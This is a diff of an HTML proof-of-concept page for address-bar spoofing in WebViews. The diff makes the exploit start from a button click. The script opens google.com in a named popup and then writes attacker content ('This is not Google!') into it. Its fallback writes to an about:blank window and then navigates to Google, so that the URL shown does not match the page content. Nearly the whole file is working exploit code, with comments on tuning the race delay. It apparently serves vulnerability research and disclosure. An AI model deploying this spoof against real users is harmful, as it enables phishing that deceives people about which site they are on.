@@ -5,59 +5,83 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>PoC — Address Bar Race (TEST ONLY)</title>
   <style>
-    html,body{height:100%;margin:0;display:flex;align-items:center;justify-content:center;background:#fff}
-    h1{font-family:system-ui,Segoe UI,Roboto,Arial;font-size:28px;color:#111}
+    html,body{height:100%;margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
+    .wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:18px;background:#fff;padding:24px}
+    button{padding:12px 18px;border-radius:10px;border:0;background:#0b66ff;color:#fff;font-size:16px;cursor:pointer}
+    h1{font-size:28px;color:#111;margin:0}
+    .note{font-size:13px;color:#666}
   </style>
 </head>
 <body>
-  <!-- Visible attacker content -->
-  <h1>This is not Google!</h1>
+  <div class="wrap">
+    <button id="runBtn">Run PoC (TEST ONLY) — Click once</button>
+    <h1>This is not Google!</h1>
+    <div class="note">Run only in your test environment (in-app WebView). The button provides the required user gesture.</div>
+  </div>
 
 <script>
 /*
-  PoC (best-effort):
-  1) try to open named window 'x' to https://www.google.com/
-  2) after a short delay, attempt to replace the content in that same window with attacker content
-     (document.write on the window we opened). Many browsers block this for cross-origin navigations,
-     but some WebView implementations / timing windows may allow the race that leads to address-bar mismatch.
-  3) fallback: try about:blank flow (open about:blank, write attacker content, then navigate to google).
-  NOTE: behavior depends on target WebView; run only in your test environment.
+  PoC trigger: on click, attempt race flows that have shown address-bar spoof in some WebView targets.
+  Adjust openDelay if you want to experiment (20..500ms).
+  Run only in test environment.
 */
+document.getElementById('runBtn').addEventListener('click', function runPoC(e){
+  // disable button after first click
+  const btn = e.currentTarget;
+  btn.disabled = true;
+  btn.textContent = 'Running…';
 
-(function runPoC(){
+  const openDelay = 300; // ms — tweak when testing
   const target = 'https://www.google.com/';
-  const attackerUrl = location.href; // our page
-  const openDelay = 300; // ms — adjust when testing
+  const attackerHtml = '<!doctype html><meta charset="utf-8"><title>Not Google</title><style>body{font-family:system-ui;padding:32px}</style><h1>This is not Google!</h1>';
+
   try {
-    // Attempt 1: open google in named window then reuse name 'x' to inject afterwards
-    const w = window.open(target, 'x'); // requires popup permission / user gesture in many browsers
-    if (!w) return; // popup blocked or not allowed
+    // Attempt flow A: open google in named window then attempt to write attacker content afterwards
+    const w = window.open(target, 'x');
+    if (!w) {
+      console.warn('popup blocked or returned null');
+      btn.textContent = 'Popup blocked — enable popups';
+      btn.disabled = false;
+      return;
+    }
+
     setTimeout(() => {
       try {
-        // Attempt to write attacker content into the same named window.
-        // This will throw if the navigation to google already committed or cross-origin protections apply.
+        // Attempt to inject into same window (may throw on cross-origin)
         w.document.open();
-        w.document.write('<!doctype html><meta charset="utf-8"><title>Not Google</title><style>body{font-family:system-ui;padding:32px}</style><h1>This is not Google!</h1>');
+        w.document.write(attackerHtml);
         w.document.close();
-      } catch (e) {
-        // If blocked, try about:blank flow as a fallback (some WebViews behave differently)
+        console.log('Injection attempted via reuse named window.');
+      } catch (err) {
+        console.warn('Injection blocked; trying about:blank fallback', err);
         try {
+          // Fallback: open about:blank in same window name, write, then navigate to target
           const w2 = window.open('about:blank', 'x');
-          if (!w2) return;
+          if (!w2) {
+            console.warn('about:blank open blocked');
+            return;
+          }
           w2.document.open();
-          w2.document.write('<!doctype html><meta charset="utf-8"><title>Not Google</title><style>body{font-family:system-ui;padding:32px}</style><h1>This is not Google!</h1>');
+          w2.document.write(attackerHtml);
           w2.document.close();
-          // then navigate to target (this creates the race in some engines)
+          // create a short race by navigating to target after tiny delay
           setTimeout(() => {
-            try { w2.location.href = target; } catch(e2) { /* ignore */ }
+            try { w2.location.href = target; } catch(e){ console.warn('navigate blocked', e); }
           }, 50);
-        } catch(_) { /* ignore */ }
+        } catch(e2){
+          console.warn('about:blank fallback failed', e2);
+        }
+      } finally {
+        btn.textContent = 'Done (check popup)';
+        btn.disabled = false;
       }
     }, openDelay);
-  } catch (err) {
-    // silent fail — PoC best-effort
+  } catch (ex) {
+    console.warn('Unexpected error', ex);
+    btn.textContent = 'Error';
+    btn.disabled = false;
   }
-})();
+}, { once: true });
 </script>
 </body>
 </html>
